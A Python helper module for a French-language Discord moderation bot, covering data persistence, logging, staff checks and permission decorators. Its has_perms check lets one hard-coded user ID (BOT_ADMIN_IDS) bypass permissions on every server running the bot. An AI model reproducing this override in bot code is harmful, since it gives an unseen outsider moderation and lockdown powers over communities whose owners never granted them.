"""Données persistantes (JSON), helpers, logs et permissions."""

import asyncio
import datetime
import io
import json
import os
import re
import sys
import time
import traceback
from collections import defaultdict, deque
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands
from config import *
from storage import *
from core import bot

# ============================== DONNÉES ==============================
DEFAULT_DATA = {
    "antiraid": {},     # guild_id -> bool
    "antiliens": {},    # guild_id -> bool
    "bienvenue": {},    # guild_id -> {"channel", "message", "banner", "role"}
    "reglement": {},    # guild_id -> {"channel", "role", "text"}
    "logs": {},         # guild_id -> {"category", "join", "messages", "sanctions", "structure"}
    "infini": {},       # guild_id -> {"channel": id, "count": int}
    "recrutement": {},  # guild_id -> channel_id (où arrivent les candidatures)
    "ticket": {},       # guild_id -> configuration des tickets
    "tickets": {},      # channel_id du ticket -> infos du ticket
    "ticketmp": {},     # {"enabled", "guild", "category"}
    "dmtickets": {},    # user_id -> channel_id du ticket MP
    "blacklist": [],    # user_ids
    "lockdown": {},     # guild_id -> permissions sauvegardées des salons
}


def load_data():
    folder = os.path.dirname(DATA_FILE)
    if folder:
        os.makedirs(folder, exist_ok=True)
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            loaded = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        loaded = {}
    for key, default in DEFAULT_DATA.items():
        loaded.setdefault(key, type(default)())
    return loaded


def save_data():
    """Sauvegarde sans jamais faire planter une commande."""
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except OSError as e:
        print(f"[ATTENTION] Impossible d'écrire {DATA_FILE} : {e}")


data = load_data()

join_log = defaultdict(deque)   # guild_id -> deque[(timestamp, user_id)]
raid_mode = set()               # guilds actuellement en mode raid
background = set()              # tâches de fond (évite qu'elles soient supprimées)


def run_bg(coro):
    task = asyncio.create_task(coro)
    background.add(task)
    task.add_done_callback(background.discard)


def is_on(section, guild):
    return bool(data[section].get(str(guild.id)))


def make_embed(title, desc="", color=discord.Color.blurple()):
    return discord.Embed(title=title, description=desc, color=color)


def is_staff(member):
    perms = member.guild_permissions
    return perms.administrator or perms.manage_messages


# Ces IDs peuvent utiliser toutes les commandes, sur n'importe quel serveur où le bot est présent
BOT_ADMIN_IDS = {158588953136463875}


def has_perms(**perms):
    """Comme has_permissions, mais les IDs de BOT_ADMIN_IDS passent toujours."""
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.user.id in BOT_ADMIN_IDS:
            return True
        current = interaction.permissions
        if current.administrator:
            return True
        missing = [name for name, needed in perms.items() if needed and not getattr(current, name, False)]
        if missing:
            raise app_commands.MissingPermissions(missing)
        return True
    return app_commands.check(predicate)


def staff_overwrites(guild):
    """Salon visible seulement par les administrateurs et les modérateurs."""
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
    }
    for role in guild.roles:
        if role != guild.default_role and (role.permissions.administrator or role.permissions.manage_messages):
            overwrites[role] = discord.PermissionOverwrite(
                view_channel=True, send_messages=True, read_message_history=True)
    return overwrites


# ============================ LOGS ============================
def log_channel(guild, kind):
    cfg = data["logs"].get(str(guild.id))
    if not isinstance(cfg, dict):
        return None
    cid = cfg.get(kind)
    return guild.get_channel(cid) if cid else None


async def send_log(guild, kind, embed):
    channel = log_channel(guild, kind)
    if channel:
        try:
            await channel.send(embed=embed)
        except discord.HTTPException:
            pass



def parse_id(text):
    try:
        return int(text.strip())
    except ValueError:
        return None


async def error_msg(interaction, text):
    await interaction.response.send_message(f"❌ {text}", ephemeral=True)

